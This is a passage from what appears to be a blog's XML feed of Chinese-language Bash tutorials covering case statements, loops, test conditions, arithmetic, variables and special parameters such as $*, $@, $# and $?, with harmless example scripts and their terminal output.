class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat case.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">case $1 in</span><br><span class="line">1)</span><br><span class="line">echo &quot;one&quot;</span><br><span class="line">;;</span><br><span class="line">2)</span><br><span class="line">echo &quot;two&quot;</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">echo &quot;others&quot;</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line">[root@hadoop100 shell]# ./case.sh 1</span><br><span class="line">one</span><br><span class="line">[root@hadoop100 shell]# ./case.sh 2</span><br><span class="line">two</span><br><span class="line">[root@hadoop100 shell]# ./case.sh 3</span><br><span class="line">others</span><br></pre></td></tr></table></figure><h1 id="三：for-循环"><a href="#三：for-循环" class="headerlink" title="三：for 循环"></a>三：for 循环</h1><h2 id="3-1-基本语法"><a href="#3-1-基本语法" class="headerlink" title="3.1 基本语法"></a>3.1 基本语法</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (( 初始值;循环控制条件;变量变化 ))</span><br><span class="line">do</span><br><span class="line">程序</span><br><span class="line">done</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for 变量 in 值 1 值 2 值 3…</span><br><span class="line">do</span><br><span class="line">程序</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h2 id="3-2-案例实操"><a href="#3-2-案例实操" class="headerlink" title="3.2 案例实操"></a>3.2 案例实操</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat sum.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for (( i=0;i&lt;=100;i++  ))</span><br><span class="line">do</span><br><span class="line">sum=$[$sum+$i]</span><br><span class="line">done</span><br><span class="line">echo $sum</span><br><span class="line">[root@hadoop100 shell]# ./sum.sh </span><br><span class="line">5050</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat foreach.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for i in 12 18 24</span><br><span class="line">do </span><br><span class="line">echo &quot;num is $i&quot;</span><br><span class="line">done</span><br><span class="line">[root@hadoop100 shell]# ./foreach.sh </span><br><span class="line">num is 12</span><br><span class="line">num is 18</span><br><span class="line">num is 24</span><br></pre></td></tr></table></figure><p>比较$*和$@区别：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat diff.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &#x27;=== $*  ===&#x27;</span><br><span class="line">for i in $*</span><br><span class="line">do</span><br><span class="line">echo &quot;letter is $i&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo &#x27;=== $@  ===&#x27;</span><br><span class="line"></span><br><span class="line">for i in $@</span><br><span class="line">do</span><br><span class="line">echo &quot;letter is $i&quot;</span><br><span class="line">done</span><br><span class="line">[root@hadoop100 shell]# ./diff.sh 123 qwe 456</span><br><span class="line">=== $*  ===</span><br><span class="line">letter is 123</span><br><span class="line">letter is qwe</span><br><span class="line">letter is 456</span><br><span class="line">=== $@  ===</span><br><span class="line">letter is 123</span><br><span class="line">letter is qwe</span><br><span class="line">letter is 456</span><br></pre></td></tr></table></figure><p>当它们被双引号“”包含时，$*会将所有的参数作为一个整体，以“$1 $2 …$n”的形式输 出所有参数；$@会将各个参数分开，以“$1” “$2”…“$n”的形式输出所有参数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat diff.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &#x27;=== $*  ===&#x27;</span><br><span class="line">for i in &quot;$*&quot;</span><br><span class="line">do</span><br><span class="line">echo &quot;letter is $i&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo &#x27;=== $@  ===&#x27;</span><br><span class="line"></span><br><span class="line">for i in &quot;$@&quot;</span><br><span class="line">do</span><br><span class="line">echo &quot;letter is $i&quot;</span><br><span class="line">done</span><br><span class="line">[root@hadoop100 shell]# ./diff.sh 123 qwe 456</span><br><span class="line">=== $*  ===</span><br><span class="line">letter is 123 qwe 456</span><br><span class="line">=== $@  ===</span><br><span class="line">letter is 123</span><br><span class="line">letter is qwe</span><br><span class="line">letter is 456</span><br></pre></td></tr></table></figure><h1 id="四：while-循环"><a href="#四：while-循环" class="headerlink" title="四：while 循环"></a>四：while 循环</h1><h2 id="4-1-基本语法"><a href="#4-1-基本语法" class="headerlink" title="4.1 基本语法"></a>4.1 基本语法</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while [ 条件判断式 ]</span><br><span class="line">do</span><br><span class="line">程序</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h2 id="4-2-案例实操"><a href="#4-2-案例实操" class="headerlink" title="4.2 案例实操"></a>4.2 案例实操</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat while.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">i=0</span><br><span class="line">sum=0</span><br><span class="line">while [ $i -le 100 ]</span><br><span class="line">do</span><br><span class="line">sum=$[$sum+$i]</span><br><span class="line">i=$[$i+1]</span><br><span class="line">done</span><br><span class="line">echo $sum</span><br><span class="line">[root@hadoop100 shell]# ./while.sh </span><br><span class="line">5050</span><br></pre></td></tr></table></figure><ul><li>使用 let 直接用数学运算符</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat while.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">i=0</span><br><span class="line">sum=0</span><br><span class="line">while [ $i -le 100 ]</span><br><span class="line">do</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">sum</span>=$[<span class="variable">$sum</span>+<span class="variable">$i</span>]</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">i=$[<span class="variable">$i</span>+1]</span></span><br><span class="line">let sum+=i</span><br><span class="line">let i++</span><br><span class="line">done</span><br><span class="line">echo $sum</span><br><span class="line">[root@hadoop100 shell]# ./while.sh </span><br><span class="line">5050</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell 条件判断</title>
      <link href="/blog/a6947573.html/"/>
      <url>/blog/a6947573.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：基本语法"><a href="#一：基本语法" class="headerlink" title="一：基本语法"></a>一：基本语法</h1><ul><li>test condition </li><li>[ condition ]（注意 condition 前后要有空格） </li><li>注意：条件非空即为 true，[  ] 为空返回 fasle；</li></ul><h1 id="二：常用判断条件"><a href="#二：常用判断条件" class="headerlink" title="二：常用判断条件"></a>二：常用判断条件</h1><h2 id="2-1-两个整数之间比较"><a href="#2-1-两个整数之间比较" class="headerlink" title="2.1 两个整数之间比较"></a>2.1 两个整数之间比较</h2><ul><li>-eq 等于（equal） </li><li>-ne 不等于（not equal） </li><li>-lt 小于（less than） </li><li>-le 小于等于（less equal） </li><li>-gt 大于（greater than） </li><li>-ge 大于等于（greater equal）</li></ul><p>注：如果是字符串之间的比较 ，用等号“&#x3D;”判断相等；用“!&#x3D;”判断不等。</p><h2 id="2-2-按照文件权限进行判断"><a href="#2-2-按照文件权限进行判断" class="headerlink" title="2.2 按照文件权限进行判断"></a>2.2 按照文件权限进行判断</h2><ul><li>-r 有读的权限（read） </li><li>-w 有写的权限（write） </li><li>-x 有执行的权限（execute）</li></ul><h2 id="2-3-按照文件类型进行判断"><a href="#2-3-按照文件类型进行判断" class="headerlink" title="2.3 按照文件类型进行判断"></a>2.3 按照文件类型进行判断</h2><ul><li>-e 文件存在（existence） </li><li>-f 文件存在并且是一个常规的文件（file） </li><li>-d 文件存在并且是一个目录（directory）</li></ul><h1 id="三：案例实操"><a href="#三：案例实操" class="headerlink" title="三：案例实操"></a>三：案例实操</h1><h2 id="3-1-数值判断"><a href="#3-1-数值判断" class="headerlink" title="3.1 数值判断"></a>3.1 数值判断</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# [ 23 -gt 22 ]</span><br><span class="line">[root@hadoop100 shell]# echo $?</span><br><span class="line">0</span><br><span class="line">[root@hadoop100 shell]# [ 23 -gt 28 ]</span><br><span class="line">[root@hadoop100 shell]# echo $?</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h2 id="3-2-权限判断"><a href="#3-2-权限判断" class="headerlink" title="3.2 权限判断"></a>3.2 权限判断</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# ll</span><br><span class="line">总用量 12</span><br><span class="line">-rwxr-xr-x. 1 root root  39 12月 11 16:29 hello.txt</span><br><span class="line">-rw-r--r--. 1 root root 225 12月 11 16:45 parameter.sh</span><br><span class="line">-rwxr-xr-x. 1 root root  25 12月 11 15:21 test.sh</span><br><span class="line">[root@hadoop100 shell]# </span><br><span class="line">[root@hadoop100 shell]# [ -w parameter.sh ]</span><br><span class="line">[root@hadoop100 shell]# echo $?</span><br><span class="line">0</span><br><span class="line">[root@hadoop100 shell]# [ -x parameter.sh ]</span><br><span class="line">[root@hadoop100 shell]# echo $?</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h2 id="3-3-文件类型判断"><a href="#3-3-文件类型判断" class="headerlink" title="3.3 文件类型判断"></a>3.3 文件类型判断</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# ll</span><br><span class="line">总用量 12</span><br><span class="line">-rwxr-xr-x. 1 root root  39 12月 11 16:29 hello.txt</span><br><span class="line">-rw-r--r--. 1 root root 225 12月 11 16:45 parameter.sh</span><br><span class="line">-rwxr-xr-x. 1 root root  25 12月 11 15:21 test.sh</span><br><span class="line">[root@hadoop100 shell]# [ -d parameter.sh ]</span><br><span class="line">[root@hadoop100 shell]# echo $?</span><br><span class="line">1</span><br><span class="line">[root@hadoop100 shell]# [ -f parameter.sh ]</span><br><span class="line">[root@hadoop100 shell]# echo $?</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h2 id="3-4-多条件判断"><a href="#3-4-多条件判断" class="headerlink" title="3.4 多条件判断"></a>3.4 多条件判断</h2><ul><li>三元运算符相同的效果</li><li>&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令，|| 表示上一 条命令执行失败后，才执行下一条命令</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# a=75</span><br><span class="line">[root@hadoop100 shell]# [ $a -lt 90 ] &amp;&amp; echo &quot;$a &lt; 90&quot; || echo &quot;$a &gt;= 90&quot;</span><br><span class="line">75 &lt; 90</span><br><span class="line">[root@hadoop100 shell]# a=99</span><br><span class="line">[root@hadoop100 shell]# [ $a -lt 90 ] &amp;&amp; echo &quot;$a &lt; 90&quot; || echo &quot;$a &gt;= 90&quot;</span><br><span class="line">99 &gt;= 90</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell 运算符</title>
      <link href="/blog/c83f2251.html/"/>
      <url>/blog/c83f2251.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：基本语法"><a href="#一：基本语法" class="headerlink" title="一：基本语法"></a>一：基本语法</h1><ul><li>$((运算式))</li><li>$[运算式]</li><li>expr 运算式</li></ul><h1 id="二：案例操作"><a href="#二：案例操作" class="headerlink" title="二：案例操作"></a>二：案例操作</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# A=$[2+3]</span><br><span class="line">[root@hadoop100 shell]# echo $A</span><br><span class="line">5</span><br><span class="line">[root@hadoop100 shell]# A=$((3+3))</span><br><span class="line">[root@hadoop100 shell]# echo $A</span><br><span class="line">6</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加号两侧要有空格</span></span><br><span class="line">[root@hadoop100 shell]# expr 1 + 2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><h1 id="三：经验总结"><a href="#三：经验总结" class="headerlink" title="三：经验总结"></a>三：经验总结</h1><ul><li>expr 中使用 * 时，要转义；例如：a&#x3D;$(expr 1 * 6)</li><li>使用$()或者反引号&#96;&#96;，可以执行表达式获取结果；</li></ul>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell 变量</title>
      <link href="/blog/bd7a1729.html/"/>
      <url>/blog/bd7a1729.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：系统预定义变量"><a href="#一：系统预定义变量" class="headerlink" title="一：系统预定义变量"></a>一：系统预定义变量</h1><h2 id="1-1-常用系统变量"><a href="#1-1-常用系统变量" class="headerlink" title="1.1 常用系统变量"></a>1.1 常用系统变量</h2><ul><li>$USER、$HOME、$PWD、$SHELL等；</li><li>使用 env 查看当前系统变量；</li><li>使用 set 显示当前 shell 中所有变量；使用 unset + 变量名 清除该变量；</li></ul><h2 id="1-2-案例操作"><a href="#1-2-案例操作" class="headerlink" title="1.2 案例操作"></a>1.2 案例操作</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# echo $USER</span><br><span class="line">root</span><br><span class="line">[root@hadoop100 shell]# echo $HOME</span><br><span class="line">/root</span><br><span class="line">[root@hadoop100 shell]# echo $SHELL</span><br><span class="line">/bin/bash</span><br><span class="line">[root@hadoop100 shell]# echo $PWD</span><br><span class="line">/root/RupertTears/shell</span><br></pre></td></tr></table></figure><h1 id="二：自定义变量"><a href="#二：自定义变量" class="headerlink" title="二：自定义变量"></a>二：自定义变量</h1><h2 id="2-1-基本语法"><a href="#2-1-基本语法" class="headerlink" title="2.1 基本语法"></a>2.1 基本语法</h2><ul><li>定义变量：变量名&#x3D;变量值，注意“&#x3D;”的前后不能有空格；</li><li>撤销变量：unset + 变量；</li><li>声明静态变量：readonly + 变量，不能 unset；</li></ul><h2 id="2-2-变量定义规则"><a href="#2-2-变量定义规则" class="headerlink" title="2.2 变量定义规则"></a>2.2 变量定义规则</h2><ol><li>变量名称可以由字母、数字和下划线组成，但不能以数字开头，环境变量名称建议大写；</li><li>等号两侧不能有空格；</li><li>在 bash 中，变量默认为字符串类型，不能进行数值运算；</li><li>变量值中若有空格，需要使用单引号或者双引号括起来。</li></ol><h2 id="2-3-案例实操"><a href="#2-3-案例实操" class="headerlink" title="2.3 案例实操"></a>2.3 案例实操</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# A=99</span><br><span class="line">[root@hadoop100 shell]# echo $A</span><br><span class="line">99</span><br><span class="line">[root@hadoop100 shell]# A=97</span><br><span class="line">[root@hadoop100 shell]# echo $A</span><br><span class="line">97</span><br><span class="line">[root@hadoop100 shell]# unset A</span><br><span class="line">[root@hadoop100 shell]# echo $A</span><br><span class="line"></span><br><span class="line">[root@hadoop100 shell]# readonly B=88</span><br><span class="line">[root@hadoop100 shell]# echo $B</span><br><span class="line">88</span><br><span class="line">[root@hadoop100 shell]# B=66</span><br><span class="line">-bash: B: 只读变量</span><br><span class="line">[root@hadoop100 shell]# unset B</span><br><span class="line">-bash: unset: B: 无法反设定: 只读 variable</span><br><span class="line">[root@hadoop100 shell]# C=1+2</span><br><span class="line">[root@hadoop100 shell]# echo $C</span><br><span class="line">1+2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数值运算</span></span><br><span class="line">[root@hadoop100 shell]# C=$((2+2))</span><br><span class="line">[root@hadoop100 shell]# echo $C</span><br><span class="line">4</span><br><span class="line">[root@hadoop100 shell]# C=$[1+2]</span><br><span class="line">[root@hadoop100 shell]# echo $C</span><br><span class="line">3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">提升变量作用域</span></span><br><span class="line">[root@hadoop100 shell]# D=&quot;hello ghost&quot;</span><br><span class="line">[root@hadoop100 shell]# echo $D</span><br><span class="line">hello ghost</span><br><span class="line">[root@hadoop100 shell]# export D</span><br><span class="line">[root@hadoop100 shell]# ll</span><br><span class="line">总用量 8</span><br><span class="line">-rwxr-xr-x. 1 root root 31 12月 11 14:56 hello.txt</span><br><span class="line">-rwxr-xr-x. 1 root root 25 12月 11 15:21 test.sh</span><br><span class="line">[root@hadoop100 shell]# vim hello.txt </span><br><span class="line">[root@hadoop100 shell]# sh hello.txt </span><br><span class="line">hello world</span><br><span class="line">hello ghost</span><br></pre></td></tr></table></figure><h1 id="三：特殊变量"><a href="#三：特殊变量" class="headerlink" title="三：特殊变量"></a>三：特殊变量</h1><h2 id="3-1-n"><a href="#3-1-n" class="headerlink" title="3.1 $n"></a>3.1 $n</h2><ul><li>$n （功能描述：n 为数字，$0 代表该脚本名称，$1-$9 代表第一到第九个参数，十以 上的参数，十以上的参数需要用大括号包含，如${10}）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# touch parameter.sh</span><br><span class="line">[root@hadoop100 shell]# vim parameter.sh </span><br><span class="line">[root@hadoop100 shell]# cat parameter.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &#x27;=== $n ===&#x27;</span><br><span class="line">echo first parameter:$1</span><br><span class="line">echo second parameter:$2</span><br><span class="line">echo three parameter:$3</span><br><span class="line">[root@hadoop100 shell]# sh parameter.sh abc 123 xyz</span><br><span class="line">=== $n ===</span><br><span class="line">first parameter:abc</span><br><span class="line">second parameter:123</span><br><span class="line">three parameter:xyz</span><br></pre></td></tr></table></figure><h2 id="3-2"><a href="#3-2" class="headerlink" title="3.2 $#"></a>3.2 $#</h2><ul><li>功能描述：获取所有输入参数个数，常用于循环,判断参数的个数是否正确以及 加强脚本的健壮性</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# vim parameter.sh </span><br><span class="line">[root@hadoop100 shell]# cat parameter.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &#x27;=== $n ===&#x27;</span><br><span class="line">echo &#x27;=== $# ===&#x27;</span><br><span class="line">echo parameter num:$#</span><br><span class="line">echo first parameter:$1</span><br><span class="line">echo second parameter:$2</span><br><span class="line">echo three parameter:$3</span><br><span class="line">[root@hadoop100 shell]# sh parameter.sh abc 123 xyz</span><br><span class="line">=== $n ===</span><br><span class="line">=== $# ===</span><br><span class="line">parameter num:3</span><br><span class="line">first parameter:abc</span><br><span class="line">second parameter:123</span><br><span class="line">three parameter:xyz</span><br></pre></td></tr></table></figure><h2 id="3-3-、"><a href="#3-3-、" class="headerlink" title="3.3 $*、$@"></a>3.3 $*、$@</h2><ul><li>$* （功能描述：这个变量代表命令行中所有的参数，$*把所有的参数看成一个整体） </li><li>$@ （功能描述：这个变量也代表命令行中所有的参数，不过$@把每个参数区分对待）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat parameter.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &#x27;=== $n ===&#x27;</span><br><span class="line">echo &#x27;=== $# ===&#x27;</span><br><span class="line">echo parameter num:$#</span><br><span class="line">echo first parameter:$1</span><br><span class="line">echo second parameter:$2</span><br><span class="line">echo three parameter:$3</span><br><span class="line">echo &#x27;=== $* ===&#x27;</span><br><span class="line">echo all parameter:$*</span><br><span class="line">echo &#x27;=== $@ ===&#x27;</span><br><span class="line">echo all parameter:$@</span><br><span class="line">[root@hadoop100 shell]# sh parameter.sh abc 123 xyz</span><br><span class="line">=== $n ===</span><br><span class="line">=== $# ===</span><br><span class="line">parameter num:3</span><br><span class="line">first parameter:abc</span><br><span class="line">second parameter:123</span><br><span class="line">three parameter:xyz</span><br><span class="line">=== $* ===</span><br><span class="line">all parameter:abc 123 xyz</span><br><span class="line">=== $@ ===</span><br><span class="line">all parameter:abc 123 xyz</span><br></pre></td></tr></table></figure><h2 id="3-4-？"><a href="#3-4-？" class="headerlink" title="3.4 $？"></a>3.4 $？</h2><ul><li>功能描述：最后一次执行的命令的返回状态。如果这个变量的值为 0，证明上一 个命令正确执行；如果这个变量的值为非 0（具体是哪个数，由命令自己来决定），则证明 上一个命令执行出错。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# pwd</span><br><span class="line">/root/RupertTears/shell</span><br><span class="line">[root@hadoop100 shell]# echo $?</span><br><span class="line">0</span><br><span class="line">[root@hadoop100 shell]# pwdr</span><br><span class="line">bash: pwdr: 未找到命令...</span><br><span class="line">相似命令是： &#x27;pwd&#x27;</span><br><span class="line">[root@hadoop100 shell]# echo $?</span><br><span class="line">127</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell 脚本</title>
      <link href="/blog/dc3000b8.html/"/>
      <url>/blog/dc3000b8.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：脚本格式"><a href="#一：脚本格式" class="headerlink" title="一：脚本格式"></a>一：脚本格式</h1><h2 id="1-1-指定解析器"><a href="#1-1-指定解析器" class="headerlink" title="1.1 指定解析器"></a>1.1 指定解析器</h2><p>脚本以 <code> #!/bin/bash</code> 开头，指定使用bash解析脚本；</p><h2 id="1-2-新建-bash-脚本"><a href="#1-2-新建-bash-脚本" class="headerlink" title="1.2 新建 bash 脚本"></a>1.2 新建 bash 脚本</h2><ul><li>创建一个bash脚本，输出 hello world；</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat hello.txt </span><br><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;hello world&quot;</span><br></pre></td></tr></table></figure><h1 id="二：执行方式"><a href="#二：执行方式" class="headerlink" title="二：执行方式"></a>二：执行方式</h1><h2 id="2-1-采用-bash-或-sh-脚本的相对路径或绝对路径（不用赋予脚本-x-权限）"><a href="#2-1-采用-bash-或-sh-脚本的相对路径或绝对路径（不用赋予脚本-x-权限）" class="headerlink" title="2.1 采用 bash 或 sh + 脚本的相对路径或绝对路径（不用赋予脚本+x 权限）"></a>2.1 采用 bash 或 sh + 脚本的相对路径或绝对路径（不用赋予脚本+x 权限）</h2><h3 id="（1）sh-脚本的相对路径"><a href="#（1）sh-脚本的相对路径" class="headerlink" title="（1）sh + 脚本的相对路径"></a>（1）sh + 脚本的相对路径</h3><figure class="highlight shell"><table><tr><td 